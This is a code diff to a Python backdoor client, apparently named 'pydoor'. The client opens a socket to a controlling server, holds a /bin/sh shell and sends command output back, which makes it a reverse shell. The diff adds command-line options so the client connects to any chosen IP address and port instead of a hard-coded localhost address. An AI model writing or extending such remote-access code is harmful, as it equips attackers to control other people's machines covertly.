@@ -5,6 +5,7 @@ import time
 import subprocess
 import os
 import sys
+import argparse
 
 BUFFER = 4096
 
@@ -15,6 +16,9 @@ class Client:
         self.cmd = 0
         self.shell = "/bin/sh"
         self.args = 0
+        self.cargs = 0
+        self.port = 0
+        self.ip = 0
 
 
     def sleep(self):
@@ -22,6 +26,14 @@ class Client:
         time.sleep(1) #Temporary solution
         self.sock.close()
         self.start()
+    def parse_args(self):
+        parser = argparse.ArgumentParser(
+            description='pydoor_decription.')
+        parser.add_argument('-p', '--port', default=9999, help='Server port to connect to.', type=int)
+        parser.add_argument('-i', '--ip', default="127.0.0.1", help='Server ip to connect to .', type=str)
+        self.cargs = parser.parse_args()
+        self.port = self.cargs.port
+        self.ip = self.cargs.ip
 
     def checkbash(self):
         
@@ -76,6 +88,8 @@ class Client:
                 self.sock.sendall(out.encode())
 
     def start(self):
+
+        self.parse_args()
         
         print("Starting client" )
 
@@ -87,7 +101,7 @@ class Client:
 
             try:
                 
-                self.sock.connect(("127.0.0.1", 9999))
+                self.sock.connect((self.ip, self.port))
                 print("Connected to server")
                 self.sock.send(b"Hey")
                 while True:
